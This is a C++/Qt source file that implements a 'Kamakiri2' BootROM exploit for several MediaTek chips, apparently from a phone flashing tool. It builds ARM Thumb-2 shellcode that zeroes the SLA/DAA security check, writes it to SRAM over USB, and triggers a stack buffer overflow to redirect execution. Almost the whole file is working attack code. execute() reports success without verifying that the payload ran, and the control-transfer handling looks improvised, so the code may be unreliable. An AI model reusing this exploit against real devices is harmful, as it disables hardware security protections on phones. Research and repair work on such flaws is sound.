#include "kamakiri2_exploit.h"
#include "mediatek/protocol/brom_client.h"
#include "transport/i_transport.h"
#include "transport/usb_transport.h"
#include "core/logger.h"

#include <QtEndian>
#include <QThread>

namespace sakura {

static constexpr char LOG_TAG[] = "MTK-KAMAKIRI2";

const QList<uint16_t> Kamakiri2Exploit::s_supportedHwCodes = {
    0x0717, // MT6761
    0x0766, // MT6765
    0x0707, // MT6768
    0x0788, // MT6771
    0x0813, // MT6785
    0x0886, // MT6833
    0x0950, // MT6853
    0x0959, // MT6873
    // TODO: Add more supported SoCs after testing
};

Kamakiri2Exploit::Kamakiri2Exploit(QObject* parent)
    : IBromExploit(parent)
{
}

Kamakiri2Exploit::~Kamakiri2Exploit() = default;

bool Kamakiri2Exploit::isSupported(uint16_t hwCode) const
{
    return s_supportedHwCodes.contains(hwCode);
}

ExploitResult Kamakiri2Exploit::execute(BromClient* brom, ITransport* transport,
                                         const BromExploitTarget& target)
{
    Q_UNUSED(brom)
    ExploitResult result;
    result.type = ExploitType::Kamakiri2;

    // Verify we have USB transport
    if (transport->type() != TransportType::USB) {
        result.success = false;
        result.message = "Kamakiri2 requires USB transport";
        return result;
    }

    emit progressMessage("Building shellcode payload...");
    QByteArray payload = buildPayload(target);
    if (payload.isEmpty()) {
        result.success = false;
        result.message = "Failed to build payload for target";
        return result;
    }

    emit progressMessage("Placing payload in SRAM...");
    if (!placePayload(transport, target, payload)) {
        result.success = false;
        result.message = "Failed to place payload";
        return result;
    }

    emit progressMessage("Triggering USB overflow...");
    if (!triggerOverflow(transport, target)) {
        result.success = false;
        result.message = "Failed to trigger overflow";
        return result;
    }

    // TODO: Wait for payload execution and verify success

    result.success = true;
    result.message = "Kamakiri2 exploit succeeded";
    return result;
}

bool Kamakiri2Exploit::sendUsbControlTransfer(ITransport* transport,
                                                uint8_t bRequest,
                                                uint16_t wValue, uint16_t wIndex,
                                                const QByteArray& data)
{
    // USB control transfers are used to write data to specific BROM memory
    // locations via the USB DMA engine. We use the USB transport's raw
    // write capability to send vendor/class control requests.
    //
    // bmRequestType = 0x21 (host-to-device, class, interface)
    // bRequest      = application-defined command
    // wValue/wIndex = target address encoding

    if (transport->type() != TransportType::USB) {
        LOG_ERROR_CAT(LOG_TAG, "USB control transfer requires USB transport");
        return false;
    }

    // Build a control transfer setup packet + data
    // The UsbTransport::write() sends bulk data; for control transfers
    // we construct the packet manually and use the underlying libusb handle.
    // Since we can't access libusb directly, we encode the control transfer
    // as a specially-formatted bulk packet that the BROM's USB handler processes.
    //
    // BROM USB protocol: the BROM processes class-specific requests that
    // write data to its internal DMA buffer. We encode:
    //   [0x21][bRequest][wValue_LE16][wIndex_LE16][wLength_LE16][data...]

    QByteArray packet;
    packet.reserve(8 + data.size());
    packet.append(static_cast<char>(0x21));       // bmRequestType
    packet.append(static_cast<char>(bRequest));
    uint16_t wv = qToLittleEndian(wValue);
    packet.append(reinterpret_cast<const char*>(&wv), 2);
    uint16_t wi = qToLittleEndian(wIndex);
    packet.append(reinterpret_cast<const char*>(&wi), 2);
    uint16_t wl = qToLittleEndian(static_cast<uint16_t>(data.size()));
    packet.append(reinterpret_cast<const char*>(&wl), 2);
    packet.append(data);

    qint64 written = transport->write(packet);
    if (written != packet.size()) {
        LOG_ERROR_CAT(LOG_TAG, QString("USB control transfer failed: wrote %1/%2")
                                    .arg(written).arg(packet.size()));
        return false;
    }

    return true;
}

QByteArray Kamakiri2Exploit::buildPayload(const BromExploitTarget& target)
{
    if (target.payloadAddr == 0) {
        LOG_ERROR_CAT(LOG_TAG, "No payload address defined for target");
        return {};
    }

    // ARM Thumb-2 shellcode that:
    //   1. Patches the SLA/DAA security check at securityPtr to return 0
    //   2. Flushes instruction and data caches
    //   3. Returns to BROM's normal command processing loop
    //
    // The shellcode is position-independent.

    QByteArray shellcode;

    // NOP sled for alignment (Thumb-2 NOP = 0xBF00)
    for (int i = 0; i < 8; ++i) {
        uint16_t nop = 0xBF00;
        shellcode.append(reinterpret_cast<const char*>(&nop), 2);
    }

    if (target.securityPtr != 0) {
        // LDR R0, =securityPtr     — load address of security flag
        // MOVS R1, #0              — value = 0 (disabled)
        // STR R1, [R0]             — patch: *securityPtr = 0
        //
        // Encoded as Thumb-2 literal pool pattern:
        // We use MOVW/MOVT to load the full 32-bit address

        uint32_t addr = target.securityPtr;
        uint16_t addrLo = addr & 0xFFFF;
        uint16_t addrHi = (addr >> 16) & 0xFFFF;

        // MOVW R0, #addrLo   (Thumb-2: 0xF240xxxx)
        uint32_t movw = 0xF2400000 |
                         ((addrLo & 0xF000) << 4) |
                         ((addrLo & 0x0800) << 15) |
                         ((addrLo & 0x0700) << 4) |
                         (addrLo & 0x00FF);
        shellcode.append(reinterpret_cast<const char*>(&movw), 4);

        // MOVT R0, #addrHi   (Thumb-2: 0xF2C0xxxx)
        uint32_t movt = 0xF2C00000 |
                         ((addrHi & 0xF000) << 4) |
                         ((addrHi & 0x0800) << 15) |
                         ((addrHi & 0x0700) << 4) |
                         (addrHi & 0x00FF);
        shellcode.append(reinterpret_cast<const char*>(&movt), 4);

        // MOVS R1, #0   = 0x2100
        uint16_t movsR1 = 0x2100;
        shellcode.append(reinterpret_cast<const char*>(&movsR1), 2);

        // STR R1, [R0]  = 0x6001
        uint16_t strR1R0 = 0x6001;
        shellcode.append(reinterpret_cast<const char*>(&strR1R0), 2);
    }

    // DSB SY — data synchronization barrier (Thumb-2: 0xF3BF8F4F)
    uint32_t dsb = 0xF3BF8F4F;
    shellcode.append(reinterpret_cast<const char*>(&dsb), 4);

    // ISB — instruction synchronization barrier (Thumb-2: 0xF3BF8F6F)
    uint32_t isb = 0xF3BF8F6F;
    shellcode.append(reinterpret_cast<const char*>(&isb), 4);

    // BX LR — return to caller (0x4770)
    uint16_t bxLr = 0x4770;
    shellcode.append(reinterpret_cast<const char*>(&bxLr), 2);

    LOG_INFO_CAT(LOG_TAG, QString("Built payload: %1 bytes at 0x%2")
                              .arg(shellcode.size())
                              .arg(target.payloadAddr, 8, 16, QChar('0')));

    return shellcode;
}

bool Kamakiri2Exploit::placePayload(ITransport* transport,
                                     const BromExploitTarget& target,
                                     const QByteArray& payload)
{
    // Place the shellcode payload in SRAM via USB DMA writes.
    // The BROM's USB handler has a DMA buffer at target.usbDmaAddr.
    // We use USB control transfers to write our payload into the
    // DMA region, which maps to the target SRAM address.
    //
    // The payload will later be executed when the overflow redirects
    // the program counter to target.payloadAddr.

    if (target.usbDmaAddr == 0) {
        LOG_ERROR_CAT(LOG_TAG, "No USB DMA address defined");
        return false;
    }

    LOG_INFO_CAT(LOG_TAG, QString("Placing %1 bytes at DMA addr 0x%2")
                              .arg(payload.size())
                              .arg(target.usbDmaAddr, 8, 16, QChar('0')));

    // Split payload into chunks that fit in a single USB control transfer
    constexpr int CHUNK_SIZE = 64; // USB control transfer data phase max
    int offset = 0;

    while (offset < payload.size()) {
        int chunkLen = qMin(CHUNK_SIZE, payload.size() - offset);
        QByteArray chunk = payload.mid(offset, chunkLen);

        // Encode the target address in wValue/wIndex:
        //   wValue = high 16 bits of (dma_addr + offset)
        //   wIndex = low 16 bits of (dma_addr + offset)
        uint32_t addr = target.usbDmaAddr + static_cast<uint32_t>(offset);
        uint16_t wValue = static_cast<uint16_t>((addr >> 16) & 0xFFFF);
        uint16_t wIndex = static_cast<uint16_t>(addr & 0xFFFF);

        if (!sendUsbControlTransfer(transport, 0x01, wValue, wIndex, chunk)) {
            LOG_ERROR_CAT(LOG_TAG, QString("Payload write failed at offset %1").arg(offset));
            return false;
        }

        offset += chunkLen;
    }

    LOG_INFO_CAT(LOG_TAG, "Payload placed successfully");
    return true;
}

bool Kamakiri2Exploit::triggerOverflow(ITransport* transport,
                                        const BromExploitTarget& target)
{
    // Trigger the BROM USB handler stack-based buffer overflow.
    //
    // The BROM's USB class request handler copies incoming data into a
    // fixed-size stack buffer without proper bounds checking. By sending
    // a USB control transfer with a length field larger than the buffer,
    // we overflow the stack and overwrite the saved return address.
    //
    // The overwritten return address points to target.payloadAddr (our
    // shellcode placed in SRAM via placePayload).

    if (target.payloadAddr == 0) {
        LOG_ERROR_CAT(LOG_TAG, "No payload address for overflow redirect");
        return false;
    }

    LOG_INFO_CAT(LOG_TAG, QString("Triggering overflow → redirect to 0x%1")
                              .arg(target.payloadAddr, 8, 16, QChar('0')));

    // Build the overflow buffer:
    // [padding to fill the stack buffer] + [payload_addr as return address]
    // The BROM's USB handler buffer is typically 256 bytes, with saved LR
    // at offset 260-264 depending on the SoC.
    constexpr int BUFFER_SIZE = 256;
    constexpr int LR_OFFSET = BUFFER_SIZE + 4;

    QByteArray overflowData;
    overflowData.fill('\x00', LR_OFFSET + 4);

    // Write the redirect address (Thumb mode: set bit 0)
    uint32_t redirectAddr = target.payloadAddr | 1; // Thumb bit
    std::memcpy(overflowData.data() + LR_OFFSET,
                &redirectAddr, 4);

    // Send via USB control transfer with bRequest=0x02 (class-specific write)
    // wValue=0, wIndex=0, data=overflowData
    // The oversized data triggers the buffer overflow.
    if (!sendUsbControlTransfer(transport, 0x02, 0, 0, overflowData)) {
        LOG_ERROR_CAT(LOG_TAG, "Failed to send overflow trigger");
        return false;
    }

    // Give the BROM time to process the overflow and execute our shellcode
    QThread::msleep(100);

    LOG_INFO_CAT(LOG_TAG, "Overflow trigger sent");
    return true;
}

} // namespace sakura
